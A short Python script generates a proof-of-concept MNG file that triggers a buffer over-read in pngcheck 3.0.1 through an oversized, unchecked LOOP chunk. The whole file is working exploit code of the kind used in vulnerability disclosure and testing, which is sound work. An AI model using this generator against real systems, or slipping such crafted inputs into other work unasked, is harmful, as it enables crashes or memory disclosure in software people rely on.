#!/usr/bin/env python3
"""
PNGCheck Vulnerability POC Generator
Generates POC file demonstrating buffer over-read
vulnerability in pngcheck 3.0.1
"""

import argparse
import pathlib
import zlib

from construct import Bytes, Const, GreedyRange, Int32ub, Struct, this

Chunk = Struct(
    "length" / Int32ub,
    "type" / Bytes(4),
    "data" / Bytes(this.length),
    "crc" / Int32ub,
)


MNG = Struct(
    "signature" / Const(b"\x8aM\x4e\x47\x0d\x0a\x1a\x0a"),
    "chunks" / GreedyRange(Chunk),
)


def create_chunk(chunk_type: bytes, chunk_data: bytes) -> dict:
    return {
        "length": len(chunk_data),
        "type": chunk_type,
        "data": chunk_data,
        "crc": zlib.crc32(chunk_type + chunk_data) & 0xFFFFFFFF,
    }


def generate_poc(output_path: pathlib.Path) -> None:
    # Command: pngcheck -v poc.mng
    chunks = [
        create_chunk(b"MHDR", b"\x00\x00\x00\x01\x00\x00\x00\x01" + b"\x00" * 20),
        create_chunk(
            b"LOOP",
            b"\x00"  # nest_level(1)
            + b"\x00\x00\x00\x01"  # iteration_count(4)
            + b"\x00"  # termination_condition(1)
            + b"\x00\x00\x00\x01" * 10000,  # Iteration_min(4) + ...
        ),
        create_chunk(b"MEND", b""),
    ]
    MNG.build_file(dict(chunks=chunks), output_path)


def main():
    parser = argparse.ArgumentParser(
        description=(
            "Generate POC files for pngcheck 3.0.1 buffer over-read "
            "vulnerability (unchecked chunk size in LOOP chunk)"
        )
    )
    parser.add_argument(
        "-o",
        "--output",
        type=pathlib.Path,
        default="poc.mng",
        help="Output file path (default: poc.mng)",
    )
    args = parser.parse_args()

    print("Generating POC...")
    generate_poc(args.output)
    print("POC file generated successfully")


if __name__ == "__main__":
    main()
